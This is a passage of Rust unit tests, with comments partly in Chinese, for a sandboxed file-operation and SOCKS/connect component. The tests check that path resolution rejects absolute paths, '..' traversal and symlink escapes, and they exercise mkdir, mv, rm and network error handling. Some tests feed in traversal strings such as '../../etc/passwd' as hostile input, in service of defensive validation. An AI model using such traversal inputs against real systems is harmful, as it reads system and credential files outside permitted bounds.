        assert!(safe_resolve(&work, "/etc/passwd").is_err());
        assert!(safe_resolve(&work, "/tmp").is_err());
    }

    #[test]
    fn safe_resolve_rejects_dotdot() {
        let (_t, work) = setup_workdir();
        assert!(safe_resolve(&work, "../x").is_err());
        assert!(safe_resolve(&work, "sub/../../etc").is_err());
        assert!(safe_resolve(&work, "../../etc/passwd").is_err());
    }

    #[test]
    fn safe_resolve_accepts_relative() {
        let (_t, work) = setup_workdir();
        // 正常相对路径（已存在的文件）
        let r = safe_resolve(&work, "existing.txt").unwrap();
        assert!(r.ends_with("existing.txt"));
        // 正常相对路径（已存在的目录）
        let r = safe_resolve(&work, "sub").unwrap();
        assert!(r.ends_with("sub"));
    }

    #[test]
    fn safe_resolve_accepts_new_path_for_mkdir() {
        // Mkdir 场景：路径还不存在，但要能 resolve（canonicalize 父目录）
        let (_t, work) = setup_workdir();
        let r = safe_resolve(&work, "newdir/nested").unwrap();
        assert!(r.starts_with(&work) || r.to_string_lossy().contains("newdir"));
    }

    #[test]
    fn safe_resolve_rejects_symlink_escape() {
        // 在 work_dir 内建一个指向外部的 symlink，试图穿越
        let dir = tempfile::tempdir().unwrap();
        let work = dir.path().join("sandbox");
        fs::create_dir_all(&work).unwrap();
        fs::write(work.join("real.txt"), "ok").unwrap();
        // symlink → /tmp（沙箱外）
        let outside = dir.path().join("outside.txt");
        fs::write(&outside, "secret").unwrap();
        #[cfg(unix)]
        {
            std::os::unix::fs::symlink(&outside, work.join("escape.link")).unwrap();
            // 通过 symlink 访问外部文件 → 必须被拒
            assert!(
                safe_resolve(&work, "escape.link").is_err(),
                "symlink 逃逸必须被 safe_resolve 拒绝"
            );
        }
    }

    #[test]
    fn do_fileop_rm_rejects_dot() {
        // rm "." 应被 work_dir 守卫拒绝（不能删沙箱根）
        let dir = tempfile::tempdir().unwrap();
        let work = dir.path().to_path_buf();
        fs::create_dir_all(&work).unwrap();
        let resp = do_fileop(FileOp::Rm, &work, ".", None);
        assert!(
            matches!(resp, Response::Err(ref e) if e.contains("work root")),
            "rm . 应被拒，got: {resp:?}"
        );
    }

    #[test]
    fn do_fileop_mkdir_creates_dir() {
        let dir = tempfile::tempdir().unwrap();
        let work = dir.path().to_path_buf();
        let resp = do_fileop(FileOp::Mkdir, &work, "newdir", None);
        assert!(matches!(resp, Response::Ok));
        assert!(work.join("newdir").exists());
    }

    #[test]
    fn do_fileop_mv_moves_file() {
        let dir = tempfile::tempdir().unwrap();
        let work = dir.path().to_path_buf();
        fs::write(work.join("src.txt"), "x").unwrap();
        let resp = do_fileop(FileOp::Mv, &work, "src.txt", Some("dst.txt"));
        assert!(matches!(resp, Response::Ok));
        assert!(!work.join("src.txt").exists());
        assert!(work.join("dst.txt").exists());
    }

    #[test]
    fn do_connect_rejects_non_tcp_proto() {
        // Only proto 0 (TCP) is supported; anything else must surface as an
        // error rather than attempting a connection.
        let resp = do_connect(7, "127.0.0.1", 80, 42);
        assert!(
            matches!(resp, Response::Err(ref e) if e.contains("proto")),
            "non-TCP proto should be rejected, got: {resp:?}"
        );
    }

    #[test]
    fn do_connect_unresolvable_host_is_err() {
        // A hostname that can't resolve must come back as Err (host resolution
        // failed), not panic or hang.
        let resp = do_connect(0, "nx-host-does-not-exist-invalid", 80, 1);
        assert!(
            matches!(resp, Response::Err(ref e) if e.contains("resolution")),
            "unresolvable host should be Err, got: {resp:?}"
        );
    }

    #[test]
    fn do_connect_closed_port_is_err() {
        // 127.0.0.1:1 is a privileged port nothing should be listening on;
        // connect must fail and we must surface it as Err within the timeout.
        let resp = do_connect(0, "127.0.0.1", 1, 9);
        assert!(
            matches!(resp, Response::Err(_)),
            "closed port should be Err, got: {resp:?}"
        );
    }

    #[test]
    fn do_socks_rejects_unsupported_op() {
        // op 1 (CONNECT) is the only supported opcode; bind/udp must error.
        let resp = do_socks(5, 2, "127.0.0.1", 1080);
        assert!(
            matches!(resp, Response::Err(ref e) if e.contains("op")),
            "unsupported socks op should be Err, got: {resp:?}"
        );
    }

    #[test]
    fn do_socks_connect_op_reports_channel() {
        // op 1 (CONNECT) acknowledges the channel as open with a status note.
        let resp = do_socks(7, 1, "example.com", 443);
        assert!(
            matches!(
                resp,
                Response::Channel {
                    chan: 7,
                    status: 0,
                    ..
                }
            ),
            "socks connect should report open channel, got: {resp:?}"
        );
    }
}
